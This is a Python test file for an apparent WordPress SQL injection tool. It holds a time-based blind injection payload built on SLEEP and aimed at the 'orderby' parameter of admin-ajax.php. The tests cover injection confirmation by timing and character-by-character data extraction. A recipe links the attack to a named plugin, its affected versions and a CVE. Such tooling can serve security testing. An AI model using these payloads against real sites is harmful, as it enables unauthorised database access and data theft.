from unittest.mock import MagicMock
from wp import sqli as wp_sqli
from wp import recipes as wp_recipes

RECIPE = {
    "method": "GET",
    "endpoint": "/wp-admin/admin-ajax.php",
    "params": {"action": "listing"},
    "inject_param": "orderby",
    "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
    "true_cond": "1=1",
    "false_cond": "1=2",
}


def test_confirm_true_when_injected_is_slower(monkeypatch):
    # control ~0.1s, injected ~5.2s → clear delay → confirmed
    seq = iter([0.1, 5.2])
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: next(seq))
    out = wp_sqli.confirm("http://t", MagicMock(), RECIPE, delay=5)
    assert out["confirmed"] is True
    assert out["injected_s"] == 5.2 and out["control_s"] == 0.1

def test_confirm_false_when_no_delay(monkeypatch):
    seq = iter([0.1, 0.15])            # both fast → not injectable
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: next(seq))
    out = wp_sqli.confirm("http://t", MagicMock(), RECIPE, delay=5)
    assert out["confirmed"] is False

def test_confirm_none_on_transport_error(monkeypatch):
    monkeypatch.setattr(wp_sqli, "_timed", lambda *a, **k: None)
    assert wp_sqli.confirm("http://t", MagicMock(), RECIPE) is None

def test_timed_injects_payload_into_the_right_param():
    http = MagicMock()
    wp_sqli._timed("http://t/", http, RECIPE, "1=1", 5)
    _, kwargs = http.get.call_args
    sent = kwargs["params"]["orderby"]
    assert "SLEEP(5)" in sent and "1=1" in sent
    assert kwargs["params"]["action"] == "listing"   # base params preserved

def test_timed_post_uses_data_channel():
    http = MagicMock()
    r = {**RECIPE, "method": "POST"}
    wp_sqli._timed("http://t", http, r, "1=1", 3)
    _, kwargs = http.post.call_args
    assert kwargs["data"]["orderby"].endswith("ELSE 0 END)")

def test_extract_reads_string_char_by_char(monkeypatch):
    # simulate the DB answering "wp" then NUL: drive _extract_char by ASCII code
    codes = iter([ord("w"), ord("p"), 0])
    monkeypatch.setattr(wp_sqli, "_extract_char",
                        lambda *a, **k: next(codes))
    assert wp_sqli.extract("http://t", MagicMock(), RECIPE, "SELECT 1", length=8) == "wp"

def test_extract_char_binary_search_resolves_ascii(monkeypatch):
    # _bit_true answers "is ASCII(char) > mid?" for the letter 'A' (65)
    target = ord("A")
    monkeypatch.setattr(wp_sqli, "_bit_true",
                        lambda base, http, recipe, cond, delay, margin:
                        _gt_from_cond(cond, target))
    code = wp_sqli._extract_char("http://t", MagicMock(), RECIPE, "SELECT 1", 1, 3, 1.0)
    assert code == target

def _gt_from_cond(cond, target):
    # cond looks like ASCII(SUBSTRING((..),p,1))>NN — compare target to NN
    n = int(cond.rsplit(">", 1)[1])
    return target > n

def test_sqli_recipe_present_for_farm_plugin():
    r = wp_recipes.find_sqli("wp-google-map-plugin")
    assert len(r) == 1
    assert r[0]["cve"] == "CVE-2026-2580"
    assert r[0]["inject_param"] == "orderby"
    assert r[0]["affected"] == "<=4.9.1"
